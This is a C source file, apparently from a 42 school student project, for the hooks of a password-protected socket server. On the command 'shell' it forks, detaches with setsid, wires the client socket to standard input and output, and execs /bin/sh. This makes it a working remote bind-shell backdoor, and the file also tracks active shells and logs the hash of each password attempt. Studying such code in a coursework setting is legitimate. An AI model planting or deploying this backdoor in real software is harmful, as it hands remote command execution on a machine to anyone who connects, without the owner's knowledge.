/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server_hooks.c                                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/21 13:28:48 by mbatty            #+#    #+#             */
/*   Updated: 2025/12/02 21:25:40 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ctx.h"

static int	check_client_password(t_ctx *ctx, t_client *client, char *msg)
{
	if (!client->logged)
	{
		char *hashed_msg = sha256(msg);
		if (!strcmp(hashed_msg, PASSWORD))
		{
			logger_log(ctx, LOG_LOG, "Client %d correct password (%s)", client->id, hashed_msg);
			server_send_to_id(&ctx->server, client->id, CORRECT_PASSWORD_TEXT);
			server_send_to_fd(client->fd, PROMPT);
			client->logged = true;
			free(hashed_msg);
			return (0);
		}
		logger_log(ctx, LOG_LOG, "Client %d wrong password (%s)", client->id, hashed_msg);
		server_send_to_id(&ctx->server, client->id, INCORRECT_PASSWORD_TEXT);
		free(hashed_msg);
		return (0);
	}
	return (1);
}

static void	start_remote_shell(t_ctx *ctx, t_client *client)
{
	logger_log(ctx, LOG_LOG, "Client %d shell command entered", client->id);
	server_send_to_id(&ctx->server, client->id, RVRS_SHELL_TEXT);

	client->shell_pid = fork();
	if (client->shell_pid == 0)
	{
		setsid();

		dup2(client->fd, STDOUT_FILENO);
		dup2(client->fd, STDERR_FILENO);
		dup2(client->fd, STDIN_FILENO);

		logger_log(ctx, LOG_INFO, "Sucessfully forked, spawning shell");
		ctx_delete(ctx, false);

		char	*argv[] = {"/bin/sh", NULL};
		execv("/bin/sh", argv);
		exit(0);
	}
}

static size_t	get_logged_users(t_server *server)
{
	size_t	res;
	size_t	i;
	t_client	**clients;

	res = 0;
	i = 0;
	clients = list_to_array(&server->clients);
	while (i < server->clients.size)
	{
		if (clients[i]->logged)
			res++;
		i++;
	}
	free(clients);
	return (res);
}

static size_t	get_active_shells(t_server *server)
{
	size_t	res;
	size_t	i;
	t_client	**clients;

	res = 0;
	i = 0;
	clients = list_to_array(&server->clients);
	while (i < server->clients.size)
	{
		if (clients[i]->shell_pid > 0)
			res++;
		i++;
	}
	free(clients);
	return (res);
}

void	get_stats(t_ctx *ctx, t_client *client)
{
	char	buf[4096];

	sprintf(buf, "Users connected to socket: %lu\n", ctx->server.clients.size);
	server_send_to_fd(client->fd, buf);
	
	sprintf(buf, "Logged users: %lu\n", get_logged_users(&ctx->server));
	server_send_to_fd(client->fd, buf);

	sprintf(buf, "Active shells: %lu\n", get_active_shells(&ctx->server));
	server_send_to_fd(client->fd, buf);
}

void	message_hook(t_client *client, char *msg, void *ptr)
{
	t_ctx	*ctx = ptr;

	if (!check_client_password(ctx, client, msg))
		return ;

	logger_log(ctx, LOG_LOG, "From %d: %s", client->id, msg);

	if (!strcmp(msg, "shell"))
	{
		start_remote_shell(ctx, client);
		return ;
	}
	else if (!strcmp(msg, "help"))
	{
		logger_log(ctx, LOG_LOG, "Client %d help command entered", client->id);
		server_send_to_id(&ctx->server, client->id, HELP_TEXT);
	}
	else if (!strcmp(msg, "quit"))
	{
		logger_log(ctx, LOG_LOG, "Client %d quit command entered", client->id);
		ctx->running = false;
		return ;
	}
	else if (!strcmp(msg, "stats"))
	{
		logger_log(ctx, LOG_LOG, "Client %d stats command entered", client->id);
		get_stats(ctx, client);
	}
	else
		server_send_to_id(&ctx->server, client->id, UNKNOWN_COMMAND_TEXT);
	server_send_to_fd(client->fd, PROMPT);
}

void	connect_hook(t_client *client, void *ptr)
{
	t_ctx	*ctx = ptr;

	server_send_to_id(&ctx->server, client->id, WELCOME_TEXT);
	server_send_to_id(&ctx->server, client->id, PASSWORD_PROMPT_TEXT);
	logger_log(ctx, LOG_INFO, "Client %d joined", client->id);
}

void	disconnect_hook(t_client *client, void *ptr)
{
	t_ctx	*ctx = ptr;

	logger_log(ctx, LOG_INFO, "Client %d left", client->id);
}
